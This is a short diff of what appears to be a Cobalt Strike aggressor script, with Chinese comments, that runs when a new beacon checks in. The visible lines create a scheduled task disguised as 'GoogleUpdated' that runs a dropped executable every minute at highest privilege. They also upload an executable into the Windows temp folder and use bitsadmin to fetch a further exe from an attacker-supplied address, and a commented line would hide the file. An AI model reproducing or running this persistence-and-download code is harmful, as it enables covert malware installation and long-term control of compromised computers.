@@ -43,7 +43,7 @@ on beacon_initial {
         bshell($1, "schtasks /create /sc minute /mo 1 /tn 'GoogleUpdated' /RL HIGHEST /tr c:\\Windows\\temp\\javaEE.exe");
         #本地上传
         bcd($1, "c:\\Windows\\temp\\");
-        bupload($1, script_resource("/script/javaEE.exe"));
+        bupload($1, script_resource("/script/javaC.exe"));
         #bitadmin远程下载
         bshell($1, 'bitsadmin /transfer GoogleUpdated /download /priority normal "这里填写你的exe地址" "c:\\Windows\\temp\\javaC.exe"');
         #bshell($1, "attrib.exe +h c:\\Windows\\temp\\javaC.exe");
